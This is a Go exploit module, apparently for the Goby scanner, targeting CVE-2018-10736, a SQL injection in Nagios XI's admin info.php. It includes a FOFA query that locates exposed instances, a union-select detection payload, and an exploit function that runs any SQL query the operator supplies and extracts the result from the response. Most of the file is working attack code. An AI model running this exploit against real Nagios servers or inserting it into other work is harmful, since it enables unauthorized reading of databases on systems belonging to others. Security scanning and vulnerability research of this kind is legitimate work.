package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Nagios XI info.php SQLi (CVE-2018-10736)",
    "Description": "A SQL injection issue was discovered in Nagios XI before 5.4.13 via the admin/info.php key1 parameter.",
    "Impact": "Nagios XI info.php SQLi (CVE-2018-10736)",
    "Recommendation": "<p>The manufacturer has not provided a patch for the vulnerability, please pay attention to the manufacturer's homepage for timely updates:</p><p>https://www.nagios.com/</p>",
    "Product": "Nagios-XI",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "Nagios XI 5.4.12及之前版本info文件存在SQL注入漏洞",
            "Description": "Nagios是一款开源的免费网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设备，打印机等。Nagios XI 5.4.12及之前版本存在SQL注入漏洞，远程攻击者可利用该漏洞执行任意的SQL命令。",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62); font-size: 14px;\">Nagios是一款开源的免费网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设备，打印机等。</span></p><p><span style=\"color: rgb(62, 62, 62); font-size: 14px;\">Nagios XI 5.4.12及之前版本存在SQL注入漏洞，远程攻击者可利用该漏洞执行任意的SQL命令。</span></p>",
            "Recommendation": "<p><span style=\"color: rgb(62, 62, 62); font-size: 14px;\">厂商尚未提供漏洞修补方案，请关注厂商主页及时更新：</span></p><p><span style=\"color: rgb(62, 62, 62); font-size: 14px;\"><a href=\"https://www.nagios.com/\" rel=\"nofollow\">https://www.nagios.com/</a></span></p>",
            "Product": "Nagios-XI",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Nagios XI info.php SQLi (CVE-2018-10736)",
            "Description": "A SQL injection issue was discovered in Nagios XI before 5.4.13 via the admin/info.php key1 parameter.",
            "Impact": "Nagios XI info.php SQLi (CVE-2018-10736)",
            "Recommendation": "<p><span style=\"color: rgb(62, 62, 62); font-size: 14px;\">The manufacturer has not provided a patch for the vulnerability, please pay attention to the manufacturer's homepage for timely updates:</span></p ><p><span style=\"color: rgb(62, 62, 62); font-size: 14px;\"><a href=\"https://www.nagios.com/\" rel= \"nofollow\">https://www.nagios.com/</a></span></p>",
            "Product": "Nagios-XI",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "(title=\"Nagios XI\" || body=\"Click the link below to get started using Nagios XI.\" || body=\"/nagiosxi/images/favicon.ico\") || (title=\"Nagios XI\" || body=\"Click the link below to get started using Nagios XI.\" || body=\"/nagiosxi/images/favicon.ico\")",
    "GobyQuery": "(title=\"Nagios XI\" || body=\"Click the link below to get started using Nagios XI.\" || body=\"/nagiosxi/images/favicon.ico\") || (title=\"Nagios XI\" || body=\"Click the link below to get started using Nagios XI.\" || body=\"/nagiosxi/images/favicon.ico\")",
    "Author": "ovi3",
    "Homepage": "https://www.nagios.com/products/nagios-xi/",
    "DisclosureDate": "2018-05-16",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.2",
    "CVEIDs": [
        "CVE-2018-10736"
    ],
    "CNVD": [
        "CNVD-2018-09749"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "header": {},
                "method": "GET",
                "uri": "/nagiosql/admin/info.php?key1=%27%20union%20select%20concat(sha1(123))%23"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "40bd001563085fc35165329ea1ff5c5ecbdbbeef",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "header": {},
                "method": "GET",
                "uri": "/nagiosql/admin/info.php?key1=%27%20union%20select%20concat(sha1(123))%23"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "40bd001563085fc35165329ea1ff5c5ecbdbbeef",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sqlQuery",
            "type": "input",
            "value": "(select user())",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Nagios-XI"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sqlQuery := ss.Params["sqlQuery"].(string)
			uri := `/nagiosql/admin/info.php?key1=%27%20union%20select%20concat(0x7b7b7e,` + url.QueryEscape(sqlQuery) + `,0x7e7d7d)%23`
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				m := regexp.MustCompile(`(?s){{~(.*?)~}}`).FindStringSubmatch(resp.Utf8Html)
				if len(m) > 0 {
					expResult.Success = true
					expResult.Output = m[1]
				} else {
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}
